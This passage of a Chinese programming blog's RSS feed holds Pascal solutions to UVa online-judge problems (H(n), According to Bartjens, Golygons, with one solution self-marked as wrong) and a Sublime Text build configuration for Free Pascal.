class="hljs-keyword">begin</span></span><br><span class="line">            writeln(<span class="hljs-number">0</span>);</span><br><span class="line">            <span class="hljs-keyword">continue</span>;</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">        fillchar(ans, sizeof(ans), <span class="hljs-number">0</span>);</span><br><span class="line">        calc2;</span><br><span class="line">        <span class="hljs-keyword">if</span> odd(n) <span class="hljs-keyword">then</span></span><br><span class="line">            dec(ans[<span class="hljs-number">1</span>])</span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line">            inc(ans[<span class="hljs-number">1</span>]);</span><br><span class="line">        div3;</span><br><span class="line">        <span class="hljs-keyword">write</span>(ans[len]);</span><br><span class="line">        <span class="hljs-keyword">for</span> i := len-<span class="hljs-number">1</span> <span class="hljs-keyword">downto</span> <span class="hljs-number">1</span> <span class="hljs-keyword">do</span></span><br><span class="line">            PrintANumber(ans[i]);</span><br><span class="line">        writeln;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line">    close(input); close(output);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/UVa/">UVa</category>
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      
      <comments>https://i.hsfzxjy.site/uva1647-computer-transformation/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Sublime configuration for Pascal</title>
      <link>https://i.hsfzxjy.site/sublime-configuration-for-pascal/</link>
      <guid>https://i.hsfzxjy.site/sublime-configuration-for-pascal/</guid>
      <pubDate>Thu, 23 Oct 2014 05:22:54 GMT</pubDate>
      
        
        
      <description>&lt;p  class=&quot;noindent&quot;&gt; 鉴于 U 盘中 Sublime 的配置常常莫名其妙地消失，在此将其记录一下。&lt;/p&gt;
&lt;h2 id=&quot;code-6&quot;&gt;Code&lt;/h2&gt;
&lt;div class=&quot;gk-code hljs&quot; data-gk-id=&quot;BLOCK1&quot;&gt;&lt;di</description>
        
      
      
      
      <content:encoded><![CDATA[<p  class="noindent"> 鉴于 U 盘中 Sublime 的配置常常莫名其妙地消失，在此将其记录一下。</p><h2 id="code-6">Code</h2><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-punctuation">{</span></span><br><span class="line">    <span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;fpc&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;-S2&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;${file}&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;-o${file_path}/${file_base_name}.exe&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span></span><br><span class="line">    <span class="hljs-attr">&quot;file_regex&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^(..[^:]*):([0-9]+):?([0-9]+)?:? (.*)$&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="line">    <span class="hljs-attr">&quot;working_dir&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;${file_path}&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="line">    <span class="hljs-attr">&quot;selector&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;source.pascal&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-attr">&quot;variants&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span></span><br><span class="line">        <span class="hljs-punctuation">{</span></span><br><span class="line">            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Run&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="line">            <span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;cmd&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;/c&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;fpc&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;-S2&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;${file}&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;-o${file_path}/${file_base_name}.exe&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="line">    <span class="hljs-string">&quot;&amp;&amp;&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;${file_path}/${file_base_name}.exe&quot;</span><span class="hljs-punctuation">]</span></span><br><span class="line">        <span class="hljs-punctuation">}</span></span><br><span class="line">    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-attr">&quot;osx&quot;</span><span class="hljs-punctuation">:</span></span><br><span class="line">    <span class="hljs-punctuation">{</span></span><br><span class="line">        <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/usr/local/bin:/usr/bin:/bin:${path}&quot;</span></span><br><span class="line">    <span class="hljs-punctuation">}</span></span><br><span class="line"><span class="hljs-punctuation">}</span></span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Pascal/">Pascal</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Sublime-Text/">Sublime Text</category>
      
      
      <comments>https://i.hsfzxjy.site/sublime-configuration-for-pascal/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>UVa11526 H(n)</title>
      <link>https://i.hsfzxjy.site/uva11526-hn/</link>
      <guid>https://i.hsfzxjy.site/uva11526-hn/</guid>
      <pubDate>Sat, 18 Oct 2014 08:03:37 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 链接：&lt;a href=&quot;http://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;page=show_problem&amp;catego</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 链接：<a href="http://uva.onlinejudge.org/index.php?option=com_onlinejudge&Itemid=8&page=show_problem&category=27&problem=2521&mosmsg=Submission%20received%20with%20ID%2014374168">Link</a> 耗时：2.232s</p></blockquote><h2 id="分析-2">分析</h2><p >粗看题目，不过就是要求这样一个式子：$\sum_{i=1}^n{[\frac{n}{i}]}$的值。但<strong>注意到</strong>：题目给的数据范围极大，有$2^{31}-1$之多，若遍历计算，则时间复杂度为$O(n)$，将严重超时，不可取。</p><p  class="nomargin"> 而事实上，通过尝试我们可以发现：$\sum_{i=1}^{n}{[\frac{n}{i}]}=2*\sum_{i=1}^{\sqrt n}{[\frac{n}{i}]}-{[\sqrt n]}^2$，这是一个重要的结论。因为这条式子一旦成立，时间复杂度即可从$O(n)$降为$O(\sqrt n)$，这是一个极为可观的改善。下面我们来证明一下这个结论：</p><p  class="nomargin"> 事实上，</p><p >$$\begin{aligned}\sum_{i=[{\sqrt n}]+1}^{n}{[\frac{n}{i}]} &amp;=1\times(n-[\frac{n}{2}])+2\times([\frac{n}{2}]-[\frac{n}{3}])+\ldots+[\sqrt{n}]\times([\frac{n}{\sqrt{n}}]-{[\frac{n}{\sqrt n}+1]}) \\&amp;=n+[\frac{n}{2}]+[\frac{n}{3}]+\ldots+[\frac{n}{\sqrt n}]-[\sqrt n]\times[\frac{n}{[\sqrt n]+1}] \\&amp;=\sum_{i=1}^{[\sqrt n]}{[\frac{n}{i}]}-{[\sqrt n]}^2\end{aligned}$$</p><p  class="par"> 从而，命题得证。</p><h2 id="code-5">Code</h2><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    n, _, i: longint;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">h</span>:</span> int64; <span class="hljs-keyword">inline</span>;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    k, t: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    h := <span class="hljs-number">0</span>;</span><br><span class="line">    t := trunc(sqrt(n));</span><br><span class="line">    k := <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> k &lt;=t <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        h := h + n <span class="hljs-keyword">div</span> k;</span><br><span class="line">        inc(k);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    h := h * <span class="hljs-number">2</span> - t * t;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    assign(input, <span class="hljs-string">&#x27;main.in&#x27;</span>); reset(input);</span><br><span class="line">    assign(output, <span class="hljs-string">&#x27;main.out&#x27;</span>); rewrite(output);</span><br><span class="line"></span><br><span class="line">    readln(_);</span><br><span class="line">    <span class="hljs-keyword">while</span> _ &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        dec(_);</span><br><span class="line">        readln(n);</span><br><span class="line">        <span class="hljs-keyword">if</span> n &lt;= <span class="hljs-number">0</span> <span class="hljs-keyword">then</span></span><br><span class="line">            writeln(<span class="hljs-number">0</span>)</span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line">            writeln(h);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line">    close(input);</span><br><span class="line">    close(output);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/UVa/">UVa</category>
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      
      <comments>https://i.hsfzxjy.site/uva11526-hn/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>UVa817 According to Bartjens</title>
      <link>https://i.hsfzxjy.site/uva817-according-to-bartjens/</link>
      <guid>https://i.hsfzxjy.site/uva817-according-to-bartjens/</guid>
      <pubDate>Fri, 17 Oct 2014 04:05:06 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 链接：&lt;a href=&quot;http://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;page=show_problem&amp;catego</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 链接：<a href="http://uva.onlinejudge.org/index.php?option=com_onlinejudge&Itemid=8&page=show_problem&category=10&problem=758&mosmsg=Submission%20received%20with%20ID%2014367065">Link</a> 状态：<strong>WA</strong></p></blockquote><h2 id="分析-1">分析</h2><p >做了两个小时，很可惜最终还是 WA 了。非常奇怪——和网上的 C++ 代码运行结果完全一样，但却 WA 了。不过，在这里我还是记录一下解题的过程。这道题数据量很小，直接爆搜每个空位，用 <code>*</code>, <code>+</code>, <code>-</code>, <code>#0</code> 来代表符号或不填。</p><h2 id="code-4">Code</h2><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">const</span></span><br><span class="line">    operators: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">4</span>] <span class="hljs-keyword">of</span> char = (<span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">#0</span>); <span class="hljs-comment">//符号</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    s: <span class="hljs-keyword">string</span>;</span><br><span class="line">    _, n: integer;</span><br><span class="line">    op: <span class="hljs-keyword">array</span> [<span class="hljs-number">0</span>..<span class="hljs-number">10</span>] <span class="hljs-keyword">of</span> char;</span><br><span class="line">    yes: Boolean;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toValue</span><span class="hljs-params">(ch: char)</span>:</span> integer;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">exit</span>(ord(ch) - ord(<span class="hljs-string">&#x27;0&#x27;</span>));</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">calcAndPrint</span>;</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    numtop, opstop: Integer;  <span class="hljs-comment">//数字栈，符号栈</span></span><br><span class="line">    num: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">10</span>] <span class="hljs-keyword">of</span> longint;</span><br><span class="line">    ops: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">10</span>] <span class="hljs-keyword">of</span> char;</span><br><span class="line">    i: integer;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    i := <span class="hljs-number">1</span>;</span><br><span class="line">    numtop := <span class="hljs-number">1</span>;</span><br><span class="line">    num[numtop] := toValue(s[<span class="hljs-number">1</span>]);</span><br><span class="line">    opstop := <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> i &lt;= n <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">while</span> (i &lt; n) <span class="hljs-keyword">and</span> (op[i] = <span class="hljs-string">#0</span>) <span class="hljs-keyword">do</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            inc(i);</span><br><span class="line">            num[numtop] := num[numtop] * <span class="hljs-number">10</span> + toValue(s[i]);</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> (op[i] <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>]) <span class="hljs-keyword">or</span> (i &gt;= n) <span class="hljs-keyword">then</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            <span class="hljs-keyword">while</span> (opstop &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">and</span> (ops[opstop] = <span class="hljs-string">&#x27;*&#x27;</span>) <span class="hljs-keyword">do</span></span><br><span class="line">            <span class="hljs-keyword">begin</span></span><br><span class="line">                dec(opstop);</span><br><span class="line">                num[numtop - <span class="hljs-number">1</span>] := num[numtop] * num[numtop -<span class="hljs-number">1</span>];</span><br><span class="line">                dec(numtop);</span><br><span class="line">            <span class="hljs-keyword">end</span>;</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> i &gt;= n <span class="hljs-keyword">then</span> <span class="hljs-keyword">break</span>;</span><br><span class="line">        inc(opstop);</span><br><span class="line">        ops[opstop] := op[i];</span><br><span class="line">        inc(i);</span><br><span class="line">        inc(numtop);</span><br><span class="line">        num[numtop] := toValue(s[i]);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    i := <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> i &lt; numtop <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">if</span> ops[i] = <span class="hljs-string">&#x27;+&#x27;</span> <span class="hljs-keyword">then</span></span><br><span class="line">            num[i+<span class="hljs-number">1</span>] := num[i] + num[i+<span class="hljs-number">1</span>]</span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line">            num[i+<span class="hljs-number">1</span>] := num[i] - num[i+<span class="hljs-number">1</span>];</span><br><span class="line">        inc(i);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> (num[numtop] = <span class="hljs-number">2000</span>) <span class="hljs-keyword">and</span> (opstop &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">then</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        yes := True;</span><br><span class="line">        <span class="hljs-keyword">write</span>(<span class="hljs-string">&#x27;  &#x27;</span>);</span><br><span class="line">        <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            <span class="hljs-keyword">write</span>(s[i]);</span><br><span class="line">            <span class="hljs-keyword">if</span> op[i] &lt;&gt; <span class="hljs-string">#0</span>  <span class="hljs-keyword">then</span></span><br><span class="line">                <span class="hljs-keyword">write</span>(op[i]);</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">        writeln(<span class="hljs-string">&#x27;=&#x27;</span>);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">dfs</span><span class="hljs-params">(t: integer)</span>;</span> <span class="hljs-comment">//搜索第t个位置</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    i: Integer;</span><br><span class="line">    ch: char;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> t = n <span class="hljs-keyword">then</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        calcAndPrint;</span><br><span class="line">        <span class="hljs-keyword">exit</span>;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">4</span> <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        ch := operators[i];</span><br><span class="line">        <span class="hljs-keyword">if</span> (ch = <span class="hljs-string">#0</span>) <span class="hljs-keyword">and</span> (s[t] = <span class="hljs-string">&#x27;0&#x27;</span>) <span class="hljs-keyword">and</span> ((t = <span class="hljs-number">1</span>) <span class="hljs-keyword">or</span> (t &gt; <span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> (op[t-<span class="hljs-number">1</span>] &lt;&gt; <span class="hljs-string">#0</span>)) <span class="hljs-keyword">then</span> <span class="hljs-keyword">continue</span>;</span><br><span class="line">        op[t] := ch;</span><br><span class="line">        dfs(t+<span class="hljs-number">1</span>);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    i: Integer;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    assign(input, <span class="hljs-string">&#x27;main.in&#x27;</span>); reset(input);</span><br><span class="line">    assign(output, <span class="hljs-string">&#x27;main.out&#x27;</span>); rewrite(output);</span><br><span class="line"></span><br><span class="line">    readln(s);</span><br><span class="line">    _ := <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> eof <span class="hljs-keyword">and</span> (s[<span class="hljs-number">1</span>] &lt;&gt; <span class="hljs-string">&#x27;=&#x27;</span>) <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        i := <span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> (s[i] <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;0&#x27;</span>..<span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;=&#x27;</span>]) <span class="hljs-keyword">do</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            inc(i);</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">        delete(s, <span class="hljs-number">1</span>, i-<span class="hljs-number">1</span>);</span><br><span class="line">        n := pos(<span class="hljs-string">&#x27;=&#x27;</span>, s) - <span class="hljs-number">1</span>;</span><br><span class="line">        inc(_);</span><br><span class="line">        writeln(<span class="hljs-string">&#x27;Problem &#x27;</span>, _);</span><br><span class="line">        yes := False;</span><br><span class="line">        fillchar(op, sizeof(op), <span class="hljs-number">0</span>);</span><br><span class="line">        dfs(<span class="hljs-number">1</span>);</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> yes <span class="hljs-keyword">then</span></span><br><span class="line">            writeln(<span class="hljs-string">&#x27;  IMPOSSIBLE&#x27;</span>);</span><br><span class="line">        readln(s);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line">    close(input); close(output);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/UVa/">UVa</category>
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      
      <comments>https://i.hsfzxjy.site/uva817-according-to-bartjens/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>UVa225 Golygons</title>
      <link>https://i.hsfzxjy.site/uva225-golygons/</link>
      <guid>https://i.hsfzxjy.site/uva225-golygons/</guid>
      <pubDate>Wed, 15 Oct 2014 06:04:51 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 链接：&lt;a href=&quot;http://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;page=show_problem&amp;catego</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 链接：<a href="http://uva.onlinejudge.org/index.php?option=com_onlinejudge&Itemid=8&page=show_problem&category=4&problem=161&mosmsg=Submission%20received%20with%20ID%2014355705">Link</a> 耗时：0.699s</p></blockquote><h2 id="思路">思路</h2><p  class="noindent"> <code>dfs(t, x, y, d, s)</code> 表示当前走了 t 步，在 (x,y)，上一个方向为 d，s 为一个求和用的辅助变量。</p><p  class="par"> 当前位置无法走完剩下的路时直接回溯。可节省接近 2s 的时间。</p><p  class="noindent"> <strong>p.s.</strong> 这道题虽然没有明说每个城市只走一次，但它的确那样判了，这一点坑了我好久。</p><h2 id="code-3">Code</h2><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment">//Accepted.</span></span><br><span class="line"><span class="hljs-keyword">const</span></span><br><span class="line">    dx: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">4</span>] <span class="hljs-keyword">of</span> integer = (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>);</span><br><span class="line">    dy: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">4</span>] <span class="hljs-keyword">of</span> integer = (<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>);</span><br><span class="line">    dir: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">4</span>] <span class="hljs-keyword">of</span> char = (<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    a: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">50</span>, <span class="hljs-number">1</span>..<span class="hljs-number">2</span>] <span class="hljs-keyword">of</span> integer; <span class="hljs-comment">//障碍物</span></span><br><span class="line">    k, i, n, _, x, y: integer;</span><br><span class="line">    ans: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">20</span>] <span class="hljs-keyword">of</span> char;</span><br><span class="line">    tot: longint;</span><br><span class="line">    vis: <span class="hljs-keyword">array</span> [-<span class="hljs-number">220</span>..<span class="hljs-number">220</span>, -<span class="hljs-number">220</span>..<span class="hljs-number">220</span>] <span class="hljs-keyword">of</span> boolean;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">judge</span><span class="hljs-params">(x1, y1, x2, y2: longint)</span>:</span> Boolean; <span class="hljs-comment">//判断刚刚走过的路上是否有障碍物</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    i: Integer;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    judge := False;</span><br><span class="line">    <span class="hljs-keyword">if</span> x1 = x2 <span class="hljs-keyword">then</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> k <span class="hljs-keyword">do</span></span><br><span class="line">            <span class="hljs-keyword">if</span> (a[i, <span class="hljs-number">1</span>] = x1) <span class="hljs-keyword">and</span> ((a[i, <span class="hljs-number">2</span>] - y1)*(a[i, <span class="hljs-number">2</span>] - y2) &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">then</span> <span class="hljs-keyword">exit</span>;</span><br><span class="line">    <span class="hljs-keyword">end</span></span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> k <span class="hljs-keyword">do</span></span><br><span class="line">            <span class="hljs-keyword">if</span> (a[i, <span class="hljs-number">2</span>] = y2) <span class="hljs-keyword">and</span> ((a[i, <span class="hljs-number">1</span>] - x1)*(a[i, <span class="hljs-number">1</span>] - x2) &lt;= <span class="hljs-number">0</span>) <span class="hljs-keyword">then</span> <span class="hljs-keyword">exit</span>;</span><br><span class="line">    judge := True;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">print</span>;</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    i: Integer;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span> <span class="hljs-keyword">write</span>(ans[i]);</span><br><span class="line">    writeln;</span><br><span class="line">    inc(tot);</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">dfs</span><span class="hljs-params">(t, x, y, d, s: integer)</span>;</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    i, sum: Integer;</span><br><span class="line">    tx, ty: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> t = n <span class="hljs-keyword">then</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (x = <span class="hljs-number">0</span>) <span class="hljs-keyword">and</span> (y = <span class="hljs-number">0</span>) <span class="hljs-keyword">then</span> print;</span><br><span class="line">        <span class="hljs-keyword">exit</span>;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line">    sum := s - t - <span class="hljs-number">1</span>;</span><br><span class="line">    inc(t);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">4</span> <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (i = d) <span class="hljs-keyword">or</span> (i + d = <span class="hljs-number">5</span>) <span class="hljs-keyword">then</span> <span class="hljs-keyword">continue</span>;   <span class="hljs-comment">//方向相同或相反</span></span><br><span class="line">        tx := x + dx[i] * t;</span><br><span class="line">        ty := y + dy[i] * t;</span><br><span class="line">        <span class="hljs-keyword">if</span> vis[tx, ty] <span class="hljs-keyword">then</span> <span class="hljs-keyword">continue</span>;              <span class="hljs-comment">//走过</span></span><br><span class="line">        <span class="hljs-keyword">if</span> abs(tx) + abs(ty) &gt; sum <span class="hljs-keyword">then</span> <span class="hljs-keyword">continue</span>;  <span class="hljs-comment">//回不去，剪枝</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> judge(x, y, tx, ty) <span class="hljs-keyword">then</span> <span class="hljs-keyword">continue</span>;  <span class="hljs-comment">//有障碍物</span></span><br><span class="line">        ans[t] := dir[i];</span><br><span class="line">        vis[tx, ty] := True;</span><br><span class="line">        dfs(t, tx, ty, i, sum);</span><br><span class="line">        vis[tx, ty] := False;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    assign(input, <span class="hljs-string">&#x27;main.in&#x27;</span>); reset(input);</span><br><span class="line">    assign(output, <span class="hljs-string">&#x27;main.out&#x27;</span>); rewrite(output);</span><br><span class="line"></span><br><span class="line">    readln(_);</span><br><span class="line">    <span 